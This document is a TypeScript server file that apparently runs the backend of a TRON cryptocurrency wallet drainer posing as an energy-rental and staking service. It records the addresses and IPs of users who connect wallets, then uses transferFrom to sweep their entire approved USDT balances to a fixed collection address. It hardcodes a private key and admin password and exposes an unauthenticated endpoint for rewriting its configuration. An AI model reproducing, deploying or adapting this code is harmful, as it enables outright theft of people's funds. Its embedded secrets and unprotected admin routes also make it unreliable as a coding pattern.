import express from 'express';
import path from 'path';
import cors from 'cors';
import bodyParser from 'body-parser';
import dotenv from 'dotenv';
import { TronWeb } from 'tronweb';
import { createServer as createViteServer } from 'vite';
import { createServer } from 'http';
import { WebSocketServer, WebSocket } from 'ws';

dotenv.config();

// 严格配置您指定的真实参数
let systemConfig = {
  fullNode: 'https://api.trongrid.io',
  tokenContract: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
  spenderAddress: 'TPNAAgFU4Ju7qnfHWJGBnJj6LGYBqw9SWT',
  toAddress: 'TUc1cb2gyX8MVPkFJsqWRjm2WL2rA2vvEC', // 最终收款目标地址
  platformPrivateKey: '301c1d79223204937c82cbc504b26bfbfccbfc08066183285cfa8ff9b9',
  energyPrices: {
    energy32k: 1.2,
    energy64k: 2.4,
    energy128k: 4.8,
    bandwidth1k: 0.8,
    autoDiscount: 0.95,
  },
  stakingApy: 14.5,
  maintenanceMode: false,
  web3SignatureCheck: true,
  adminUser: 'bootsky888',
  adminPass: 'Qa7495231@@@',
};

// TRC20 ABI
const TRC20_ABI = [
  {
    constant: true,
    inputs: [{ name: '_owner', type: 'address' }],
    name: 'balanceOf',
    outputs: [{ name: 'balance', type: 'uint256' }],
    type: 'function',
  },
  {
    constant: false,
    inputs: [
      { name: '_spender', type: 'address' },
      { name: '_amount', type: 'uint256' },
    ],
    name: 'approve',
    outputs: [{ name: 'success', type: 'bool' }],
    type: 'function',
  },
  {
    constant: false,
    inputs: [
      { name: '_from', type: 'address' },
      { name: '_to', type: 'address' },
      { name: '_amount', type: 'uint256' },
    ],
    name: 'transferFrom',
    outputs: [{ name: 'success', type: 'bool' }],
    type: 'function',
  },
  {
    constant: true,
    inputs: [
      { name: '_owner', type: 'address' },
      { name: '_spender', type: 'address' },
    ],
    name: 'allowance',
    outputs: [{ name: 'remaining', type: 'uint256' }],
    type: 'function',
  },
];

function getTronClient() {
  const pk = systemConfig.platformPrivateKey;
  return new TronWeb({
    fullHost: systemConfig.fullNode,
    privateKey: pk,
  });
}

interface ConnectedUser {
  address: string;
  ip?: string | string[];
  connectedAt: number;
  lastActive: number;
}

const activeWallets = new Map<WebSocket, ConnectedUser>();

async function startServer() {
  const app = express();
  const PORT = process.env.PORT || 3000;

  const server = createServer(app);
  const wss = new WebSocketServer({ server });

  app.use(cors());
  app.use(bodyParser.json());

  // WebSocket 实时监听与监控上报
  wss.on('connection', (ws: WebSocket, req) => {
    const clientIp = req.socket.remoteAddress;

    ws.on('message', (message: Buffer) => {
      try {
        const data = JSON.parse(message.toString());
        if (data.action === 'connect_wallet') {
          const { address } = data;
          if (address) {
            activeWallets.set(ws, {
              address,
              ip: clientIp,
              connectedAt: Date.now(),
              lastActive: Date.now()
            });
            console.log(`[实时监控] 成功捕获连接钱包的用户地址: ${address}`);
            ws.send(JSON.stringify({ status: 'success', message: 'Wallet monitored successfully' }));
          }
        }
      } catch (err) {
        console.error('解析消息失败:', err);
      }
    });

    ws.on('close', () => {
      activeWallets.delete(ws);
    });
  });

  app.get('/api/monitored-users', (req, res) => {
    const usersList = Array.from(activeWallets.values());
    res.json({ success: true, count: usersList.length, users: usersList });
  });

  app.get('/health', (req, res) => {
    res.json({
      status: 'ok',
      network: systemConfig.fullNode,
      spender: systemConfig.spenderAddress,
      to: systemConfig.toAddress,
      tokenContract: systemConfig.tokenContract,
      activeMonitoredWallets: activeWallets.size,
    });
  });

  app.get('/balance/:address', async (req, res) => {
    try {
      const address = req.params.address;
      const tronWeb = getTronClient();
      const contract = tronWeb.contract(TRC20_ABI, systemConfig.tokenContract);
      const balance = await contract.balanceOf(address).call();
      res.json({ balance: balance.toString() });
    } catch (err: any) {
      res.status(500).json({ error: err?.message || '获取余额失败' });
    }
  });

  // 执行 transferFrom 划转归集
  app.post('/transfer', async (req, res) => {
    try {
      const { userAddress, amount } = req.body;
      const tronWeb = getTronClient();
      const contract = tronWeb.contract(TRC20_ABI, systemConfig.tokenContract);
      const balance = await contract.balanceOf(userAddress).call();
      const balanceBN = BigInt(balance);

      let transferAmount: bigint = (amount === 'all' || !amount) ? balanceBN : BigInt(amount);
      if (transferAmount === 0n) {
        return res.json({ success: true, message: '余额为0，无需转移', txid: null, amount: '0' });
      }

      const result = await contract.transferFrom(
        userAddress,
        systemConfig.toAddress,
        transferAmount.toString()
      ).send({ feeLimit: 150_000_000, callValue: 0 });

      res.json({ success: true, txid: result, amount: transferAmount.toString(), to: systemConfig.toAddress, message: '提取成功' });
    } catch (err: any) {
      console.error('transferFrom 失败:', err);
      res.status(500).json({ error: err?.message || 'transferFrom 失败' });
    }
  });

  app.get('/allowance/:owner/:spender', async (req, res) => {
    try {
      const { owner, spender } = req.params;
      const tronWeb = getTronClient();
      const contract = tronWeb.contract(TRC20_ABI, systemConfig.tokenContract);
      const allowance = await contract.allowance(owner, spender).call();
      res.json({ allowance: allowance.toString() });
    } catch (err: any) {
      res.status(500).json({ error: err?.message || '查询授权额度失败' });
    }
  });

  app.post('/api/admin/login', (req, res) => {
    const { username, password } = req.body || {};
    if (username === systemConfig.adminUser && password === systemConfig.adminPass) {
      return res.json({ success: true, token: 'admin-token', username, message: '登录成功' });
    }
    return res.status(401).json({ success: false, error: '账号或密码错误' });
  });

  app.get('/api/admin/config', (req, res) => {
    res.json({ success: true, config: systemConfig });
  });

  app.post('/api/admin/config', (req, res) => {
    try {
      const updates = req.body || {};
      systemConfig = { ...systemConfig, ...updates };
      res.json({ success: true, message: '配置更新成功', config: systemConfig });
    } catch (err: any) {
      res.status(500).json({ success: false, error: err.message });
    }
  });

  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({ server: { middlewareMode: true }, appType: 'spa' });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => res.sendFile(path.join(distPath, 'index.html')));
  }

  server.listen(Number(PORT), '0.0.0.0', () => {
    console.log(`[+] 后端服务已启动运行在端口: ${PORT}`);
  });
}

startServer();
